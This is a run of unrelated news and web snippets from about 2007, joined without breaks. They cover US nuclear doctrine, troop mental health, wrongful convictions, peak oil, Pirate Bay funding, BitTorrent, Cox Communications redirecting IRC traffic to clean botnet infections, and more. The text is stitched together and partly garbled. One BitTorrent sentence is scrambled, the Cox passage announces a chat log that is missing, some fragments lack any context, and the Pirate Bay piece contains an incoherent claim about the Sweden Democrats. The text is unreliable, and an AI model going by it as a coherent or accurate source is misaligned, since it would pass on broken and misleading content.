The book presents abundant evidence of the warnings repeatedly sent to her by the CIA ( one of the agency 's untrumpeted successes ) and of her failure to take them seriously .
He notes that Ms Rice seems to have had a blind spot about the potency of terrorism in general .
Glenn Kessler 's book concentrates on Ms Rice 's first two years as secretary of state and her ultimately failed attempt to relaunch American foreign policy .
It is a fascinating account of how diplomacy is conducted up close .
Mr Kessler pays due credit to Ms Rice 's intelligence and energy .
But his clear conclusion is that most of the problems she has tried to solve have been beyond her .
He is excoriating about the limits of what Ms Rice 's team calls “ practical idealism ” ; to Mr Kessler the term is “ nonsensical ” .
Her campaign for democracy in the Middle East comes in for particular criticism : when elections bring awkward results , as in Lebanon and Palestine , Ms Rice 's instinct has been simply to treat the results as aberrations , ignoring her own words about democracy .
The administration has long ago given up trying to promote freer societies in Saudi Arabia and Egypt , both American allies .
Efforts to keep Iran non-nuclear have yielded nothing , and the war in Iraq still defies solution .
It is possible , Mr Kessler concludes , that a future historian will see Ms Rice more favourably .
But , as her current job draws to an end , the prospects do not look good .
Amid increasing tension between the United States and Iran over Tehran ’s nuclear program , and growing concern about overstretched U.S. ground forces , the George W. Bush administration is moving steadily toward adopting the preemptive use of nuclear weapons against non-nuclear states as an integral part of its global military strategy .
According to a March document by the Joint Chiefs of Staff that was recently posted to the Pentagon ’s Web site , Washington will not necessarily wait for potential adversaries to use what it calls " weapons of mass destruction " before resorting to a nuclear strike against them .
The document , entitled " Doctrine for Joint Nuclear Operations [ .pdf ] , " has yet to be approved by Pentagon chief Donald Rumsfeld , according to an account published in Sunday ’s Washington Post .
However , it is largely consistent with the administration ’s 2002 Nuclear Posture Review ( NPR ) , which was widely assailed by arms control advocates for lowering the threshold for the use of nuclear weapons by the U.S .
" What we see as significant is that they are considering using nuclear weapons against non-nuclear powers in preemptive first strikes , " said Ivan Oelrich of the Federation for American Scientists ( FAS ) about both the NPR and the new Doctrine .
The Doctrine would also appear to contradict the administration ’s oft - stated claim that it is significantly reducing the role of nuclear weapons in its global military strategy .
" [ T ] he new doctrine reaffirms an aggressive nuclear posture of modernized nuclear weapons maintained on high alert , " according to Hans Kristensen of the Natural Resources Defense Council ( NRDC ) .
" [ T ] he new doctrine ’s approach grants regional nuclear - strike planning an increasingly expeditionary aura that threatens to make nuclear weapons just another tool in the toolbox , " he wrote last week in Arms Control Today .
" The result is nuclear preemption , which the new doctrine enshrines into official U.S. joint nuclear doctrine for the first time , where the objective no longer is deterrence through threatened retaliation but battlefield destruction of targets , " according to Kristensen .
The Doctrine is the latest in a series of documents adopted by the administration that has moved the U.S. away from the traditional view that nuclear weapons should be used solely for the purposes of defense and deterrence .
Along with the NPR , which called for the development of new delivery systems for nuclear weapons and noted that China , North Korea , Iraq , Iran , Syria , and Libya could all be targets , the new view was expounded by Bush himself in his September 2002 National Security Strategy document .
" We can not let our enemies strike first , " he warned at the time .
In mid-2004 , according to national security analyst William Arkin , Rumsfeld approved a top - secret " Interim Global Strike Alert Order " that directed the military to be prepared to attack potential adversaries , notably Iran and North Korea , that are developing WMD .
" Global strike , " according to a classified January 2003 presidential directive obtained by Arkin , is defined as including nuclear , as well as conventional , strikes " in support of theater and national objectives . "
The new document is the first to spell out various contingencies in which a preemptive nuclear strike might be used , including :
If an adversary intended to use WMD against the U.S. multinational or allied forces or a civilian population ;
In cases of an imminent attack from an adversary ’s biological weapons that only effects from nuclear weapons can safely destroy ;
Against adversary installations , including WMD ; deep , hardened bunkers containing chemical or biological weapons ; or the command - and - control infrastructure required for the adversary to execute a WMD attack against the U.S. or its friends and allies ; and
In cases where a demonstration of U.S. intent and capability to use nuclear weapons would deter WMD use by an adversary .
The previous Doctrine , promulgated under the Clinton administration in 1995 , made no mention of the preemptive use of nuclear weapons against any target , let alone describe scenarios in which such use would be considered .
Moreover , the new Doctrine blurs the distinction that existed during the Cold War between strategic and theater nuclear weapons by " assign[ing ] all nuclear weapons , whether strategic or nonstrategic , support roles in theater nuclear operations , " according to Kristensen .
Another particularly worrisome aspect of the latest Doctrine , according to Oelrich , is its conflation of biological , chemical and nuclear weapons as one " WMD " threat that could justify a U.S. nuclear strike , particularly given the huge disparity in destructive and lethal impact between chemical weapons , on the one hand , and nuclear arms on the other .
" What we are seeing now is an effort to lay the foundations for the legitimacy of using nuclear weapons if [ the administration ] suspects another country might use chemical weapons against us , " he said .
" Iraq is a perfect example of how this doctrine might actually work ; it was a country where we were engaged militarily and thought it would deploy chemical weapons against us . "
Critics also fear that resorting to nuclear weapons may have become increasingly attractive to the administration as the Army and Marines have become bogged down in Iraq and , to a lesser extent , Afghanistan .
" [ U.S. Strategic Command ] planners , recognizing that U.S. ground forces are already overcommitted , say that a global strike must be able to be implemented ‘ without resort to large numbers of general purpose forces , ’ " according to Arkin ’s account of recent directives received by commanders charged with contingency planning .
The new strategy may also be relevant to the situation in Iran , which is known to have chemical weapons but whose nuclear program Washington insists is being used to produce weapons as well .
Writing in The American Conservative last month , columnist Philip Giraldi , a former CIA officer who also worked at the Defense Intelligence Agency , reported that Vice President Dick Cheney ’s office had tasked the United States Strategic Command with drawing up a contingency plan for a " large - scale air assault on Iran employing both conventional and tactical nuclear weapons " in the event of another 9/11 terrorist attack .
" Many of the targets are hardened or are deep underground and could not be taken out by conventional weapons , hence the nuclear option , " he wrote .
In fact , it is questionable whether even U.S. nuclear weapons could reach their hardened targets underground , which is why the Pentagon has been pressing Congress for several years to finance research into the development of the so - called Robust Nuclear Earth Penetrator .
Democrats and a small minority of Republicans in the House of Representatives have so far blocked the administration ’s request , although it will be taken up later this fall by a joint House - Senate conference committee .
The new Strategy may be aimed in part at exerting pressure on the lawmakers to approve the request .
Meanwhile , however , administration critics warn that instead of deterring potential adversaries from pursuing nuclear weapons , the new Doctrine is almost certain to have the opposite effect .
" We make it seem that nuclear weapons are essential to our security , " noted Oelrich .
" So it immensely enhances the cachet of nuclear weapons to others . "

Members of the armed forces who bore the brunt of the wars in Iraq and Afghanistan are suffering a mounting toll of post - traumatic stress , alcoholism and family breakdown , an extensive examination of mental health in the military has found .
The study sampled 5,500 service personnel , focusing on the 20 % deployed for more than 13 months over a three - year period between 2001 and 2006 - the maximum term set by government guidelines .
Researchers at King 's College London found those in this category were more likely to have symptoms of post - traumatic stress disorder and problems at home during and after deployment .
This was particularly apparent in those with direct combat exposure .
The study , funded by the Ministry of Defence and published in the British Medical Journal , found that one in four had " severe " alcohol problems , compared with 10 % of those deployed for less than five months .
Post - traumatic stress disorder was found in 5.2 % of those deployed above the 13 - month limit , compared with 3 % of those who spent less than five months in conflict zones .
The study covered deployments since 2000 and included tours of duty in Kosovo and Sierra Leone , as well as Afghanistan and Iraq .
The researchers found that those deployed for longer and those who were uncertain about when they would return home were more likely to suffer mental distress .
The study concluded : " A clear and explicit policy on the duration of each deployment of armed forces personnel may reduce the risk of post - traumatic stress disorder .
An association was found between deployment for more than a year in the past three years and mental health that might be explained by exposure to combat . "
The report comes after warnings that the navy , army and Royal Air Force were overstretched in Iraq and Afghanistan .
The study found that 86 % of those who had been deployed in the previous three years had spent time in Iraq .
A spokesman for the Ministry of Defence said the latest figures showed that less than 1 % of Royal Navy , 12 % of army and 6 % of RAF personnel were exceeding the individual service 's harmony guidelines of 13 months in combat over a three - year period .
The number of people exceeding the harmony guidelines was coming down , he said .
The under - secretary of state for defence , Derek Twigg , said : " We recognise mental illness as a serious and disabling condition and we want to ensure that our people have the best possible mental health support .
This is why the MoD commissioned research to monitor the health of those deployed on operations .
" We have taken great steps to raise awareness and to reduce the stigma associated with mental illness .
These include pre- and post - deployment briefing and the availability of support , assessment and , if required , treatment - both during and after deployments .
We are studying the research to see how we can reduce even further the number of troops who suffer from mental illness .
" We have always been open that we have a high operational tempo , but as the chief of defence staff has said in the past we are stretched but not overstretched . "
Mr Twigg said the vast majority of British troops did not have their tours extended and were on operations for no longer than six to seven months .
" As such , it indicates that our current policies on the duration of tours are right .
We are taking steps to remind the small number of troops who see their tours extended about the support that is available to them .
We have , for example , mental health nurses in Iraq and Afghanistan .
I would encourage service personnel who think that they might be suffering from mental illness related to their service to seek professional help . "

LAST week , Judge Nancy Gertner of the Federal District Court in Boston awarded more than $ 100 million to four men whom the F.B.I. framed for the 1965 murder of Edward Deegan , a local gangster .
It was compensation for the 30 years the men spent behind bars while agents withheld evidence that would have cleared them and put the real killer — a valuable F.B.I. informant , by the name of Vincent Flemmi — in prison .
Most coverage of the story described it as a bizarre exception in the history of law enforcement .
Unfortunately , this kind of behavior by those whose sworn duty it is to uphold the law is all too common .
In state courts , where most death sentences are handed down , it occurs regularly .
My recently completed study of the 124 exonerations of death row inmates in America from 1973 to 2007 indicated that 80 , or about two - thirds , of their so - called wrongful convictions resulted not from good - faith mistakes or errors but from intentional , willful , malicious prosecutions by criminal justice personnel .
( There were four cases in which a determination could not be made one way or another . )
Yet too often this behavior is not singled out and identified for what it is .
When a prosecutor puts a witness on the stand whom he knows to be lying , or fails to turn over evidence favorable to the defense , or when a police officer manufactures or destroys evidence to further the likelihood of a conviction , then it is deceptive to term these conscious violations of the law — all of which I found in my research — as merely mistakes or errors .

On any given day , an average of 148,000 people will die .
That means over a million people have died in the last week .
Nearly 5 million have died since around this time last month , which , incidentally , was exactly when we were briefly bombarded with the news that 199 people were killed in a Brazilian airliner crash .
Other deaths and possible deaths we ’ve heard about since then include the 11 victims found so far in the Interstate 35 bridge collapse in Minneapolis ; the six miners missing and three rescuers killed in a Utah coal mine ; hundreds dead in the earthquake in Peru .
To a somewhat lesser extent , we ’ve also heard about 100 - plus troops and the 2,000 - plus civilians reportedly killed in the Iraq war in the last month .
There was also news of the passing of several celebrities , including evangelist Tammy Faye Messner , talk - show host Merv Griffin and baseball ’s Phil Rizzuto .
For all the ink , video footage and treacly Larry King segments devoted to these deaths , it should come as no surprise that they represent a fraction of a fraction of the number of people who have died since around the last time a new moon appeared in the sky .
Based on estimates from the National Highway Traffic Safety Administration , there were about 3,500 automobile - related deaths during that monthlong period .
U.S. cancer deaths hover around 42,000 a month .
As for heart disease , the American Heart Assn. tells us that someone dies of cardiovascular disease every 36 seconds .
And that ’s just in this country .

As staggering as these numbers are , they do n’t seem to scare or interest us nearly as much as things like plane crashes , mountain lion attacks , deadly roller coaster mishaps or avian flu .
And because the news media is savvy about ( and complicit in ) our fears and fascinations , we are fed an endless supply of death news that has little to do with how most people actually die .
Nonetheless , death by falling asteroid seems infinitely more real than death by cholesterol .
Call it selective fear , selective mourning .
It may be an act of denial , but it ’s also an act of self - protection .
Figures from the National Center for Health Statistics suggest that the lifetime odds of dying in a plane crash are about 1 in 20,000 .
Those same figures put the chances of dying in a car accident about 1 in 100 .
So why , when our plane is taxiing down the runway , do many of us still indulge in various acts of magical thinking ( if we can name the last 12 presidents the wing wo n’t fall off ) even after blithely getting in our cars and making what is , statistically speaking , the far more perilous drive to the airport ?
The most obvious answer is that the real risks ( and , by extension , the multitude of daily tragedies those risks engender ) simply hit too close to home .
We do n’t think about car accidents and heart disease not because we think it wo n’t happen to us but because we suspect or even assume it will .
Given the inevitably , our response is to put it out of our minds entirely .
All that freed - up mental space leaves plenty of room to obsess about the proverbial lightning strike .
Take the case of the Minneapolis bridge collapse .
Yes , it was the kind of visually intense story that television news can’t get enough of , and , yes , death toll estimates were initially as high as 80 .
But within a few days , it seemed clear that far fewer people had died .
And although that does n’t make the bridge collapse ( or , for that matter , the subsequent Utah mine collapse ) any less of a tragedy , it does make you wonder what other stories were bumped from the headlines in favor of breathless , around - the - clock coverage of the search - and - rescue operation , the victims ’ families and the ensuing presidential visit .

Death does n’t discriminate , but at least when it comes to the deaths of strangers , neither is it immune to certain hierarchical precepts .
A cursory glance at what we pay most attention to suggests that grand spectacle rules the day .
Sinking ferryboats trump bus accidents , but plane crashes , with their unspeakable , almost supernatural brand of horror , are the most riveting of all .
Young victims , naturally , hold more emotional currency than their adult counterparts , making the school bus crash a far better candidate for selective mourning than the commuter train derailment , which is in turn far more captivating than the deadly highway pileup .
Mammoth disasters like the Indian Ocean tsunami aside , small - scale blight on home soil will almost always catch more eyeballs than larger events far away .
As the death toll in Peru soared past 500 , on TV at least , it was the Utah mine tragedy we could n’t get enough of .
Meanwhile , 3,000 people , mostly sub-Saharan African children , will die today of malaria with nary an Associated Press story to spread the news .

We care , but the diseases and the car wrecks that kill thousands of us every day are so common that they ’re the opposite of news .
They ’re also usually too frightening to contemplate .
Freak accidents , in contrast , are freakishly comforting .

Which came first –the chicken or the European ?
Popular history , and a familiar rhyme about Christopher Columbus , holds that Europeans made contact with the Americas in 1492 , with some arguing that the explorer and his crew were the first outsiders to reach the New World .
But chicken bones recently unearthed on the coast of Chile — dating prior to Columbus ’ “ discovery ” of America and resembling the DNA of a fowl species native to Polynesia — may challenge that notion , researchers say .
“ Chickens could not have gotten to South America on their own — they had to be taken by humans , ” said anthropologist Lisa Matisoo - Smith from the University of Auckland , New Zealand .
Polynesians made contact with the west coast of South America as much as a century before any Spanish conquistadors , her findings imply .
DNA in bone
The chicken bones were discovered at an archaeological site called El Arenal , on the south coast of Chile , alongside other materials belonging to the indigenous population .
While chickens are n’t native to the region , it was believed the local Araucana species found there now was brought to the Americas by Spanish settlers around 1500 .
Tests on the bones , however , now indicate the birds arrived well before any European made landfall in South America , Matisoo - Smith and her colleague Alice Storey found .
“ We had the chicken bone directly dated by radio carbon .
The calibrated date was clearly prior to 1492 , ” Matisoo - Smith told LiveScience , noting that it could have ranged anywhere from 1304 to 1424 .
“ This also fits with the other dates obtained from the site ( on other materials ) , and it fits with the cultural period of the site . ”
Did Polynesians continue eastwards ?
DNA extracted from the bones also matched closely with a Polynesian breed of chicken , rather than any chickens found in Europe .
Polynesia was settled by sailors who migrated from mainland Southeast Asia , beginning about 3,000 years ago .
They continued gradually eastwards , but were never thought to have journeyed further than Easter Island , about 2,000 miles off the coast of continental Chile .
The chicken DNA suggests at least one group did make the harrowing journey across the remaining stretch of Pacific , Matisoo - Smith said .
“ We can not say exactly which island the voyage came from .
The DNA sequence is found in chickens from Tonga , Samoa , Niue , Easter Island and Hawaii , ” Matisoo - Smith said .
“ If we had to guess , we would say it was unlikely to have come from West Polynesia and most likely to have come from Easter Island or some other East Polynesian source that we have not yet sampled . ”
The results are detailed in the latest issue of the journal Proceedings of the National Academy of Sciences .
Kon -Tiki trip in reverse
It might be the most tangible , but this is n’t the first evidence that pre-Columbian voyages from the Pacific to South America were possible .
In 1947 , Thor Heyerdahl , the famous Norwegian anthropologist , made the voyage from Peru to Polynesia aboard his Kon-Tiki raft to prove the trip was doable with a rudimentary vessel .
There are more scientific arguments , too , said Matisoo - Smith .
“ There is increasing evidence of multiple contacts with the Americas , ” she said , “ based on linguistic evidence and similarities in fish hook styles . ”
Physical evidence of human DNA from Polynesia has yet to be found in South America , she added .
Congress returns this week , with its approval ratings plummeting among constituents .
Time is short for House Democrats to fully deliver on their campaign promise to turn around the “ culture of corruption ” in the Capitol .
Progress was made in the January crackdown on free gifts , travel and meals from influence brokers .
But now comes the hard part  facing up to the need for a new Congressional integrity office to help the moribund ethics committee enforce anticorruption rules .
The committee was a study in denial during the Jack Abramoff scandal , and clearly requires extra integrity muscle .
But a task force charged with recommending how this could work is running into resistance from members after reports that it would call for allowing outsiders to file ethics complaints  raising fears of campaign - season smears .
While the issue is reported comatose , if not dead , Speaker Nancy Pelosi has indicated that she will pursue the subject .
And the ingredients for a workable integrity office are hardly beyond reach .
What must not be jettisoned is the core requirement that the office have credible power to conduct thorough preliminary inquiries  including access to Congressional subpoena power  to do its job of making recommendations for further action by the ethics committee .
There is no need to let outsiders file complaints if the integrity panel has enough power and discretion to initiate investigations .

Bunch points out that the press went nuts covering the recent wired cheese dry run terror warnings leaked by the DHS , but as it turns out , the evidence did n't show any kind of terrorist dry run whatsoever .
He also points out that it was completely unnecessary to do this right at the height of the summer travel season , although I imagine that 's exactly why they timed it that way .
The project asked participants to recall traumatic events from their past .
They were asked to emote anger , and other primary emotions .
Each participant was wired to EEG and EKG sensors and monitored [ for as long as 8 - 14 hours ] .
The resulting information was visualized as still images using Iris Explorer and visualized in realtime , interactive space using specially developed data acquisition modules .

Charles DARWIN ( 1809 - 1882 )
Charles Darwin’s The Origin of Species ( publ. 1859 ) is a pivotal work in scientific literature and arguably the pivotal work in evolutionary biology .
The book ’s full title is On the Origin of Species by Means of Natural Selection , or the Preservation of Favoured Races in the Struggle for Life .
It introduced the theory that populations evolve over the course of generations through a process of natural selection .
It was controversial because it contradicted religious beliefs which underlay the then current theories of biology .
Darwin ’s book was the culmination of evidence he had accumulated on the voyage of the Beagle in the 1830s and added to through continuing investigations and experiments since his return .
( Summary from Wikipedia )
A spokesman for the Swedish torrent tracker The Pirate Bay , has admitted on Swedish tv that their servers and broadband bandwidth were financed by Carl Lundström , one of the alleged sponsors of Swedish far - right political party Sweden Democrats .
" We needed the money , " spokesman Tobias Andersson told Bert Karlsson , a former politician and front figure of the New Democracy ( Ny Demokrati ) party .
Carl Lundström is the CEO and largest shareholder of Rix Telecom , a large provider in Sweden , where at least one member of The Pirate Bay used to work .
Lundström is also believed to be a major financier of Sweden Democrats , a nationalist movement which opposes all forms of racism .
However , it was also modeled after other " euronationalist " parties , most notably the French National Front .
Several members have criminal records or extremist connections .
" I think he liked file sharing , " Tobias Andersson said about Lundström .
Almost a year after a police raid on the Pirate Bay 's servers , a Swedish prosecutor last week announced that he intends to press charges against the individuals behind the file - sharing site for violating copyright .
Tobias Andersson says he expected a move of this kind and does n't believe that it stands a chance in the courts .
The Pirate Bay , Andersson argues , merely points to other pages , and does n't contain copyright protected material .
Just last week the torrent tracker announced a new all - you - can - download music site with members of the Swedish rock band Lamont . ®
Cynical me wondered if this was some sort of viral campaign for Smosh.com , but no , it ’s just a slice of user - generated awesomeness .
Apparently , this young lady wanted a Smosh T - shirt , but the site was n’t sure exactly where her home country was .
The result is a two - part rant ( part one , part two ) that ’s often as hilarious as it is incomprehensible .
I think the Czech Republic should use her for an international awareness campaign .
She already has a good slogan with , “ Who is better , George Bush or Jaromir Jagr ? ”

Do a Google search of the Web on " global warming " and it calls up more than 80 million references .
Search for " peak oil " and the number exceeds 10 million .
In two years or so , world concern over crude oils supplies should be so great that a Google search on that subject probably will top that of global warming , predicts Matthew Simmons , chairman of Houston - based Simmons & Company International , an investment banking firm for the energy industry .
Peak oil refers to the time when production of crude oil in the world ( or in a country or in an oil field ) reaches its peak and starts to slide .
It does n't mean the world has run out of oil – only that the supply of oil is n't rising to meet growing demand .
That change could be reflected in even higher prices , if the demand for oil does n't stall or fall .
Last Tuesday , the price of oil futures on the New York Mercantile Exchange set a record , rising as high as $ 78.40 .
That exceeded the previous high of $ 77.03 set in July 2006 at the onset of Israel 's war in Lebanon .
The world output of oil actually already peaked in May 2005 at 74.2 million barrels a day , says Mr. Simmons .
Since then , production has fallen about 1 million barrels a day ( MB/D ) .
If that trend continues , the results for the world economy will be " so real , so devastating " that peak oil concerns will overwhelm slower - moving global warming in grabbing world attention .
That 's because today 's civilization hangs heavily on an adequate supply of oil .
It , for instance , fuels most vehicles , heats many homes and businesses , and is used in many chemicals and plastics .
Oil and natural gas now meets some 60 percent of the world 's primary energy needs .
Oil shortages , warns Simmons , could lead to war .
Dr. Fadhil Chalabi , executive director of the Centre for Global Energy Studies in London , is n't so pessimistic .
He notes that with higher prices , the demand for oil has started to fall , at least in the 30 industrial nations belonging to the Paris - based Organization for Economic Cooperation and Development .
Since 2006 , their demand has dropped by about 400,000 barrels a day .
And the demand for crude in bustling and populous China and India rose only 0.7 percent last year .
His research institute forecasts world demand will rise " not more than 1 percent a year . "
Other researchers predict 1.4 to 1.5 percent a year , a significant difference .
Mr. Chalabi says forecasts for the world oil industry cannot be relied on , having proved wrong in the past .
Today 's forecasts do not fully take into account the impact higher prices have in reducing demand and encouraging alternative energy sources , he adds .
However , concern over the world 's oil supply is mounting .
Last month , the International Energy Agency ( IEA ) issued a report warning that world oil demand will rise faster than previously expected .
The result could be a supply crunch – " extremely tight , " one IEA economist told the BBC .
The report sees world oil demand soaring 2.2 percent a year to 95.8 MB / D by 2012 .
That 's up from the 2 percent annual growth rate it forecast in February .
The Paris - based IEA advises 26 industrial nations , and , in Simmons 's view , it now has a more realistic chief economist , Dr. Fatih Birol .
So the agency , Simmons says , is no longer " a cheerleader for cheap oil , " always saying crude oil supplies are so large that oil prices will surely fall .
In July , the National Petroleum Council , a federal advisory group representing the oil industry , published a 476 - page study titled " Facing the Hard Truths About Energy . "
Simmons , one of 350 participants who prepared the study , holds that its wording is not stern enough considering the statistics on the oil demand / supply situation it includes .
The study states , " The world is not running out of energy resources , but there are accumulating risks to continuing expansion of oil and natural gas production from the conventional sources relied upon historically . "
Simmons uses such terms as " hogwash " and " junk report " in describing the study .
For years , many in the oil industry viewed the peak oil forecasts by Simmons as odd .
Now his position has a lot of company .
Several websites publish sophisticated material on the issue .
There 's the Oil Drum ( www.theoildrum.com), featuring " Prof. Goose " and " Gail the Actuary . "
Those pseudonyms hide a full professor at Colorado State University and an actuary in an Atlanta suburb .
There 's also the Energy Bulletin ( www.energybulletin.net).
The site 's coeditor , Bart Anderson , say it receives 11,000 visits a day .
Peak oil enthusiasts , he says , have now divided into a majority seeing life after an oil crunch and those he calls " doomers . "
In Britain , Douglas Low , director of the Oil Depletion Analysis Centre ( www.odac-info.org), foresees a " crisis coming up " with a real shortage of oil .
In June , he notes , the world used 1.5 MB / D more crude than it produced .
He expects much higher oil prices in the future .
" It 's not a very happy message , " he says .
" A lot of people want to slip it under the carpet . "

The Lifter is an asymmetrical capacitor which uses High Voltage ( > 20 KV ) to produce a thrust .
The Lifter works without moving parts , flies silently , uses only electrical energy and is able to lift its own weight plus an additional payload .
The Lifter uses the Biefeld - Brown effect discovered by Thomas Townsend Brown in 1928 .
The basic design of the Lifter has been fully described in the Townsend Brown US Patent N°2949550 filed on Aug 16 , 1960 and titled " Elektrokinetic Apparatus " , you will find in this patent the full description of the main principle used in the Lifter devices .
Today , more than 350 Lifter replications have been done successfully by many experimenters and physicists Worldwide ( see The Worldwide Lifters replications logbook ) .
On January 22th , 2003 , I have fully demonstrated with the 250 g weight Lifter " Maximus ] [ " experiment , that a Lifter can be scaled up and also that such a device is able to lift 60 g of payload .
It is now possible to build a VTOL craft which will use the Biefeld - Brown effect to fly silently and without moving parts ( see VTOL Lifter - Craft Mk III ) only powered by electrical energy ...

Students explain why they handed Bush letter urging ban on torture
David Edwards and Mike Sheehan
Published : Tuesday June 26 , 2007 Print This Email This
While meeting with a group of high school seniors from the Presidential Scholars program in the East Room of the White House , President Bush received an unexpected surprise : a letter signed by 50 of them urging Bush to halt " violations of the human rights " of terror suspects held by the United States .
According to the Associated Press , " The White House says Bush did not expect the letter but took a moment to read it and talk with a young woman who'd handed it to him . "
White House spokesman Dana Perino said Bush let the student know " the United States does not torture and that we value human rights , " a statement seemingly contradicted by Bush 's signing statement which gave him power to largely ignore a Congressional ban on torture spearheaded by Sen. John McCain ( R - AZ ) .
In the following CNN video , three of the seniors who met with the president discuss the event .
The designation of Presidential Scholar is among the nation 's highest honors for high school grads , with the honorees traveling to Washington for lectures and seminars , the AP reports .
A worldwide expansion of nuclear power has little chance of significantly reducing carbon emissions but will add dangerously to the proliferation of nuclear weapons - grade materials and the potential for nuclear terrorism , says a leading research group that has analysed the possible uptake of civil atomic power over the next 65 years .
The Oxford Research Group paper , funded by the Joseph Rowntree charitable trust , says that the worldwide nuclear " renaissance " planned by the industry to provide cheap , clean power is a myth .
Although global electricity demand is expected to rise by 50 % in the next 25 years , only 25 new nuclear reactors are currently being built , with 76 more planned and a further 162 proposed , many of which are unlikely to be built .
This compares with 429 reactors in operation today , many of which are already near the end of their useful lives and need replacing soon .
For nuclear power to make any significant contribution to a reduction in global carbon emissions in the next two generations , the paper says , the industry would have to construct nearly 3,000 new reactors - or about one a week for 60 years .
" A civil nuclear construction and supply programme on this scale is a pipe dream , and completely unfeasible .
The highest historic rate [ of build ] is 3.4 new reactors a year , " says the report .
The paper - Too Hot to Handle ?
The Future of Civil Nuclear Power - comes as the UK government consults on a new generation of nuclear power stations and at a time of increased terrorist activity .
It argues that worldwide stocks of high - grade uranium are expected to have run dangerously low within 25 years and that a significant increase in nuclear power beyond then will require a new generation of " breeder " reactor .
Though this will reduce the need for high - grade uranium , it says , it will also add immensely to the amount of weapons - grade plutonium being produced .
" Even a small expansion in the use of nuclear power for electricity generation would have serious consequences for the spread of nuclear weapons to countries that do not now have them and for nuclear terrorism , " it says .
The researchers say that nuclear proliferation is inevitable in the next decade .
If all the reactors planned today are built , a further seven countries will have nuclear power .
Nine more potentially volatile Middle Eastern countries , including Saudi Arabia and Syria , have expressed interest in civil nuclear power , says the paper .
In addition , future demand for electricity will come from the world 's poorest countries , which are expected to add nearly 3.5 billion to their populations in the next 60 years .
" If nuclear power is to play more than a marginal role in combating global warming , then nuclear power will have to be operated in countries like Bangladesh , Congo , Indonesia , Nigeria and Pakistan , which at present have no nuclear reactors " , it says .
" According to the UN's International Atomic Energy Agency , within 30 - 40 years at least 30 countries are likely to have access to fissile materials from their civil nuclear power programmes that can be used for nuclear weapons and competent nuclear physicists and engineers who could design and fabricate them .
" Future breeder reactors will be fuelled with plutonium and only a small input of uranium .
The plutonium will be of a type suitable for use in the most efficient nuclear weapons .
The normal operation of these reactors will , as a matter of course , multiply the amount of weapons - usable plutonium available across the world .
" If the decision to go with nuclear power is taken , then the UK will implement a flawed and dangerously counter - productive energy policy .
" The question is whether in the 21st century the security risks associated with civil nuclear power can be managed , or not ?
Society has to decide whether or not the risks of proliferation and nuclear terrorism in a world with many nuclear power reactors are acceptable . "
Backstory
A scramble for uranium to feed the new generation of nuclear plants in China and Russia has led to a huge price increase : the commodity shot up 45 % to $ 138 a pound in the past three months alone - as compared with $ 10.75 in early 2003 , when atomic power was out of favour and nobody wanted to construct facilities .
Nuclear is now seen as one way of meeting soaring energy demand while keeping greenhouse gas emissions low .

BitTorrent is a protocol that enables fast downloading of large files using minimum Internet bandwidth .
It costs nothing to use and includes no spyware or pop-up advertising .
Unlike other download methods , BitTorrent maximizes transfer speed by gathering pieces of the file you want and downloading these pieces simultaneously from people who already have them .
This process makes popular and very large files , such as videos and television programs , download much faster than is possible with other protocols .

In this article , we 'll examine how BitTorrent works and how it is different from other file - distribution methods .
In addition , you 'll learn how to use BitTorrent and what the future might hold for this innovative approach to serving files over the Internet .
Traditional Client - Server Downloading
To understand how BitTorrent works and why it is different from other file - serving methods , let 's examine what happens when you download a file from a Web site .
It works something like this :
You open a Web page and click a link to download a file to your computer .
client ) tells the The Web browser software on your computer ( the ) tells the server ( a central computer that holds the Web page and the file you want to download ) to transfer a copy of the file to your computer .
The transfer is handled by a protocol ( a set of rules ) , such as FTP ( File Transfer Protocol ) or HTTP ( HyperText Transfer Protocol ) .
" " Client - server download process
­ The transfer speed is affected by a number of variables , including the type of protocol , the amount of traffic on the server and the number of other computers that are downloading the file .
If the file is both large and popular , the demands on the server are great , and the download will be slow .
For more information about Web servers and the traditional client - server download , see How Web Servers Work .
Next , we 'll look at how peer - to - peer sharing differs from this process .

If Rosa Parks had lived two years longer , what happened today in the halls of Congress might have killed her .
It certainly would have broken her heart .
Rep. John Conyers , venerable member of Congress , finally chair of the House Judiciary Committee , a man who worked with Parks in Alabama and then hired her on his staff after he won election to Congress in Detroit , today had several dozen impeachment activists , including Gold Star Families for Peace founder Cindy Sheehan , Iraq Veteran Against the War activist Lennox Yearwood and Intelligence Veterans for Sanity founder Ray McGovern arrested for conducting a sit-in in his office in the Rayburn House Office Building .

Internet service provider Cox Communications is reportedly diverting attempts to reach certain online chat channels and redirecting them to a server that attempts to remove spyware from the computer .
By doing so the company seems to be attempting to cleanse computers of malware that hijacks the computers resources to send spam and participate in online service attacks as part of a large network of compromised computers known as a botnet .
Specifically , Cox ’s DNS server is responding to a domain name request for an Internet Relay Chat server .
Instead of responding with the correct IP address for the server , Cox sends the IP address of its own IRC server ( 70.168.70.4 ) .
That server then sends commands to the computer that attempt to remove malware .
The resulting chat session , as reported to a network administrator mailing list , looks like this :

Though clever , the tactic is being heavily debated by networking experts on the NANOG mailing list , some of whom question the effectiveness of the technique and who question whether blocking access to the channels for all users ( by breaking the DNS protocol ) in order to stop some malware is the appropriate solution .
Cox does not seem to be blocking all IRC channels , but anyone trying to reach those channels using Cox ’s DNS servers will be unable to reach them .
Professor Steven Bellovin wrote that the tactic shows why DNS lookups should be digitally signed to show their authenticity :
If my host expects the response to be signed and it is n’t , my host can scream bloody murder .
The whole point of DNSSEC is to prevent random changes to DNS replies , whether by hackers or by ISPs .
Yes , they can change it , but they ca n’t change it without being caught .
IRC channels are heavily used by programmers , non-traditional communities and black - hat hackers , among others .
The malware - infected zombie computers Cox is attempting to clean can also be controlled remotely by having them connect to an IRC channel where they get instructions from their controller .
UPDATE : Andrew Matthews , who runs one of the redirected IRC servers , first reported this behavior to the NANOG list and has more info on his own site .
Adam Waters of Support Intelligence gives a hearty thumbs - up :
[ I ]t ca n’t be a surprise that the ISP ’s have come , at long last , to fixing zombies without customer notification / consent .
At this point the threat to the fundamental trust and usability of the network surpasses my privacy , or technical concerns around breaking DNS .
Frankly , redirecting requests to malware sites , or IRC communication channels , to cleaner - sites sounds like a practical short term tactic to me .
And if it raises awareness around the seriousness of the bot problem I ’m all for it .
Sean Donelan , a NANOG regular , tells THREAT LEVEL there ’s nothing to see here , really , just a minor glitch with abuse watch lists .

BBC News , Shaddle Bazaar , eastern Afghanistan
Opium sellers are wary of outsiders Travelling on Afghanistan 's main Jalalabad to Torkham road , you eventually arrive at Shaddle Bazaar , a market of around 30 shops in the eastern province of Nangarhar , on the border with Pakistan .
At first glance , it looks like any other normal market offering everyday goods .
